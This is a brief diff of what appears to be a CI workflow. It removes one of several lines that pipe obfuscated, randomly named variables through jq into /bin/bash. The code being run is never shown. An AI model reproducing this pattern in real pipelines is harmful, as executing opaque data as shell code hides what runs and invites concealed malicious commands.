@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$os7975" | jq -r .zvoqg1295 | /bin/bash
           printf '%s' "$fvrl316" | jq -r .rm2 | /bin/bash
           printf '%s' "$n1248" | jq -r .s852 | /bin/bash
-          printf '%s' "$fptwx9" | jq -r .lg3609 | /bin/bash
           echo $zl44159 | jq -r .as59 | /bin/bash
 
       - name: Save results
